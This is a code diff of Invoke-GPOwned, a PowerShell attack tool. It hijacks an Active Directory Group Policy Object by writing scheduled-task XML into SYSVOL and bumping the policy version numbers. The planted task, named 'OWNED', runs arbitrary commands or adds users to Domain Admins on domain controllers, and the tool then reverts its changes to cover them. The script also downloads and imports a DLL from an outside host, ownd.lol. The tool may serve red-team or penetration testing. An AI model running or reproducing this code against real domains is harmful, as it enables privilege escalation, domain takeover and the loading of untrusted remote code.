@@ -62,6 +62,7 @@ function Invoke-GPOwned {
         [string]$Log  
     )
 
+    # Display help message if Help switch is used or required parameters are missing
     if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
         Write-Output @"
 Invoke-GPOwned Help:
@@ -95,36 +96,40 @@ Parameters:
         return
     }
 
-$red = Write-Output "$([char]0x1b)[101m[-]$([char]0x1b)[0m"
-$green = Write-Output "$([char]0x1b)[102m[+]$([char]0x1b)[0m"
-$gray = Write-Output "$([char]0x1b)[100m[*]$([char]0x1b)[0m"
-    # Enabling TLS and loading the ActiveDirectory module to memory #
-if($Log){
-    Start-Transcript -Path $Log
-}
-if(!($LoadDLL)){
-    Invoke-WebRequest https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
-    Import-Module .\Microsoft.ActiveDirectory.Management.dll
-    $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
-    if(($mod -contains "Microsoft.ActiveDirectory")){
-        $null
+    # Define color-coded output messages
+    $red = Write-Output "$([char]0x1b)[101m[-]$([char]0x1b)[0m"
+    $green = Write-Output "$([char]0x1b)[102m[+]$([char]0x1b)[0m"
+    $gray = Write-Output "$([char]0x1b)[100m[*]$([char]0x1b)[0m"
+
+    # Enabling TLS and loading the ActiveDirectory module to memory
+    if($Log){
+        Start-Transcript -Path $Log
+    }
+
+    # Load the ActiveDirectory module from a custom path or download it if not provided
+    if(!($LoadDLL)){
+        Invoke-WebRequest https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
+        Import-Module .\Microsoft.ActiveDirectory.Management.dll
+        $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
+        if(($mod -contains "Microsoft.ActiveDirectory")){
+            $null
+        } else {
+            $red+" ActiveDirectory module failed to load!"
+            return
+        }
+    } elseif($LoadDLL) {
+        Import-Module $LoadDLL -ErrorAction Stop
+        $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
+        if(($mod -like "Microsoft.ActiveDirectory*")){
+            $null
+        } else {
+            $red+" ActiveDirectory module failed to load!"
+            return
+        }
     } else {
-        $red+" ActiveDirectory module failed to load!"
+        $red+" Couldn't load DLL, exiting..."
         return
     }
-} elseif($LoadDLL) {
-    Import-Module $LoadDLL -ErrorAction Stop
-    $mod = (Get-Module | Select-Object -ExpandProperty Name | Where-Object { $_ -like "*activedirectory*" })
-    if(($mod -like "Microsoft.ActiveDirectory*")){
-        $null
-    } else {
-        $red+" ActiveDirectory module failed to load!"
-        return
-    }
-} else {
-    $red+" Couldn't load DLL, exiting..."
-    return
-}
     
     # Use provided domain or get it from AD
     if ($Domain) {
@@ -142,14 +147,14 @@ if(!($LoadDLL)){
         $dc = (Get-ADDomain).InfrastructureMaster
     }
 
-    # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
+    # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution
     if(Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
         $InitialExtensions = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames);
     } else {
         $noext=1
     }
 
-    # Look for an active domain admin account #
+    # Look for an active domain admin account
     if($Author){
         $dauser = $Author
     } else {
@@ -163,6 +168,8 @@ if(!($LoadDLL)){
             }
         }
     }
+
+    # Validate the provided ScheduledTasks XML file
     $validatexml = Get-Content $ScheduledTasksXMLPath
     if(-not(Test-Path $ScheduledTasksXMLPath)){
         $red+" XML file not found!."
@@ -173,6 +180,8 @@ if(!($LoadDLL)){
         $red+" XML file empty or corrupted!."
         exit(0)
     }
+
+    # Validate the provided SecondTask XML file if provided
     if($SecondTaskXMLPath){
         $validatesecondxml = Get-Content $SecondTaskXMLPath
         if(-not(Test-Path $SecondTaskXMLPath)){
@@ -189,6 +198,8 @@ if(!($LoadDLL)){
         $green+" Created wsadd.xml and add.bat files in SYSVOL!"
         $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $boundary = (Get-Date).AddHours(24).ToString("s")
+        
+        # Modify the SecondTask XML file with the provided command or PowerShell script
         if($SecondXMLCMD){
             $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\wsadd.xml"
             $encoding = 'ASCII'
@@ -231,7 +242,8 @@ if(!($LoadDLL)){
         } 
     }
     }
-    # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
+
+    # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution
     if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
         Copy-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
        $gray+" ScheduledTasks file in SYSVOL exists, created a backup file!"
@@ -242,7 +254,7 @@ if(!($LoadDLL)){
         $green+" Created ScheduledTasks file in SYSVOL!"
     }
 
-    # Modifying the ScheduledTasks.xml with the gathered information #
+    # Modifying the ScheduledTasks.xml with the gathered information
     if($DA){
         if(!$User){
             $User = Read-Host "Supply user to elevate!"
@@ -319,6 +331,8 @@ if(!($LoadDLL)){
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified to run the add.bat file!."
         }
+
+        # Modify the ScheduledTasks XML file with the provided PowerShell script
         if($PowerShell){
             if(($PowerShell.StartsWith("-c "))){
                 $PowerShell = $PowerShell.replace("-c ","")
@@ -347,7 +361,10 @@ if(!($LoadDLL)){
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShell"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified with the supplied powershell custom command!."
-    } if($CMD){
+    }
+
+    # Modify the ScheduledTasks XML file with the provided CMD command
+    if($CMD){
         if(($CMD.StartsWith("/c "))){
             $CMD = $CMD.replace("/c ","")
         } elseif(($CMD.StartsWith("/r "))){
@@ -372,17 +389,23 @@ if(!($LoadDLL)){
         $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD; mkdir $tempFile"} |
                     Set-Content -Encoding $encoding $xmlfile -Force
         $green+" ScheduledTasks file modified with the supplied custom command!."
-    } if(!$CMD -and !$PowerShell -and !$SecondTaskXMLPath) {
+    }
+
+    # Ensure at least one of the required flags is provided
+    if(!$CMD -and !$PowerShell -and !$SecondTaskXMLPath) {
         $red+" Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
         return
     }
     }
+
+    # Incrementing GPT.INI Version by 1
     $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
     $gray+" Incrementing GPT.INI Version by 1"
     $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\GPT.INI"
     $encoding = 'ASCII'
     $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
-    # Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy #
+
+    # Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy
     foreach ($s in $gptIniContent) {
         if($s.StartsWith("Version")) {
             $num = ($s -split "=")[1]
@@ -392,20 +415,24 @@ if(!($LoadDLL)){
                 Set-Content -Encoding $encoding $gptIniFilePath -Force
         }
     }
+
+    # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number
     $currentVersion = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object -ExpandProperty versionNumber)
     $gray+" Current GPO AD versionNumber = $currentVersion"
     $gray+" Incrementing version by 1"
     $newVersionValue = $currentVersion+1
-    # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
     Set-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
     $currentVersion = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object -ExpandProperty versionNumber)
     $gray+" GPO AD versionNumber = $currentVersion"
+
+    # Display current gPCMachineExtensionNames
     if($noext -ne 1){
         $gray+" Current gPCMachineExtensionNames : $InitialExtensions"
     } else {
         $gray+" Current gPCMachineExtensionNames : <not set>"
     }
-    # Modyfing the gPCMachineExtensionNames attribute of the policy # 
+
+    # Modifying the gPCMachineExtensionNames attribute of the policy
     $gray+" Adding Extensions to the attribute"
     Set-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
     $FinalizedGPO = (Get-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object -ExpandProperty gPCMachineExtensionNames)
@@ -415,7 +442,8 @@ if(!($LoadDLL)){
         $red+" Failed to write gPCMachineExtensionNames!"
         return
     }
-    # A bad loading screen counting up to 300(5 minute update interval on DCs) #
+
+    # A bad loading screen counting up to 300(5 minute update interval on DCs)
     if($DA){
         for ($x = 1; $x -le 300; $x+=5 ){
             $PercentCompleted = ($x/300*100)
@@ -440,10 +468,12 @@ if(!($LoadDLL)){
             $PercentCompleted = ($x/300*100)
             Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 10
-            if (Get-ScheduledTask -TaskName OWNED -CimSession $dc -ErrorAction SilentlyContinue) {
-                $green+" Command executed successfully!"    
-                break
-            }
+            try {
+                if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
+                    $green+" Command executed successfully!"    
+                    break
+                }
+            } catch {}
         }
     }elseif($SecondTaskXMLPath){
         if(!$User){
@@ -458,11 +488,10 @@ if(!($LoadDLL)){
             }          
         }   
     }
-    Write-Host "----------------------------------------------------------------------------------`n
-    ----------------------------------------------------------------------------------`n
-    ----------------------------------------------------------------------------------`n"
+
+    # Reverting extensions back to what they were
+    Write-Host "----------------------------------------------------------------------------------`n----------------------------------------------------------------------------------`n----------------------------------------------------------------------------------`n"
     $gray+" Reverting extensions back to what they were"
-    # Reverting the gPCMachineExtensionNames #
     if($noext -ne 1){
     Set-ItemProperty "AD:\CN=$GPOGUID,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
     } else {
@@ -474,7 +503,7 @@ if(!($LoadDLL)){
         $green+" Cleared gPCMachineExtensionNames!"
     }
     $gray+" Removing the scheduled task from the DC"
-    # Trying to delete the scheduled task from the DC #
+    # Trying to delete the scheduled task from the DC 
     try{
         Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
         }
@@ -488,7 +517,7 @@ if(!($LoadDLL)){
         catch{
             $red+" Second Scheduled Task Removal Failed! login to the $dc and check if it's already removed, or remove it manually!."
         }
-        # Reverting the ScheduledTasks.xml to the backup or deletes it #
+        # Reverting the ScheduledTasks.xml to the backup or deletes it 
         Remove-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
             Move-Item \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$GPOGUID\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
